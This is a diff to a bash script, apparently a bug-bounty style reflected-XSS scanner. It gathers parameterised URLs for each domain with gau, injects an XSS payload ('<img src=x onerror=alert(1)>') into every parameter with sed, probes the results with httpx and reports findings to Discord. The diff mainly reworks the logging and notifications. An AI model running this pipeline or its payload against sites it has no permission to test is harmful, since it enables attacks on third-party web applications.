@@ -5,7 +5,7 @@ while IFS= read -r domain; do
     echo -e "\nURL grabbing started using gau for $domain \n"
 
     # Run the gau command and save the output to a file
-    gau "$domain" --subs --threads 10 | grep "=" > "${domain}_gau_equalTo.txt"
+    gau "$domain" --subs | grep "=" > "${domain}_gau_equalTo.txt"
     
     # Use sed to modify the URLs and save the result to a new file
     sed -e 's/=\([^&]*\)/=-->'\'';\\"\/><\/textarea><img src=x onerror=alert(1)><XSS>/g' "${domain}_gau_equalTo.txt" > "${domain}_updated_urls.txt"
@@ -19,7 +19,21 @@ while IFS= read -r domain; do
     cat "${domain}_unique_urls.txt" | httpx -ms "<XSS>" -o "$PWD/potentialXSS/${domain}_pxss.txt"
     
     # logs entry
-    wc "${domain}_gau_equalTo.txt" "${domain}_unique_urls.txt" "$PWD/potentialXSS/${domain}_pxss.txt" >> logs.txt
+    (
+		echo "============================================="
+		echo "Domain Name                              : ${domain}"
+
+		unique_urls_lines=$(wc -l < "${domain}_unique_urls.txt")
+		equalTo_lines=$(wc -l < "${domain}_gau_equalTo.txt")
+		pxss_lines=$(wc -l < "$PWD/potentialXSS/${domain}_pxss.txt")
+
+		# Print the results
+		printf "%-40s : %d line\n" "URLs has = sign" "$equalTo_lines"
+		printf "%-40s : %d line\n" "Unique URLs" "$unique_urls_lines"
+		printf "%-40s : %d line\n" "Potential XSS" "$pxss_lines"
+
+		echo "============================================="
+	) >> logs.txt
 
     # Remove temp files
     rm -rf "${domain}_gau_equalTo.txt" "${domain}_updated_urls.txt" "${domain}_unique_urls.txt"
@@ -32,6 +46,6 @@ while IFS= read -r domain; do
     find . -maxdepth 1 -type f ! -name 'domain.txt' ! -name 'logs.txt' -exec rm -f {} +
 
     # Notify
-    echo -e "RXSS Scanning finished for $domain\nRXSS found: $(cat $PWD/XSS/${domain}_xss.txt | wc -l)" | notify -provider discord -id rxss
+    echo -e "XSS found: $(cat $PWD/XSS/${domain}_xss.txt | wc -l) and Potential XSS found: $(cat $PWD/potentialXSS/${domain}_pxss.txt | wc -l) at $domain" | notify -provider discord -id rxss
 
 done < $1
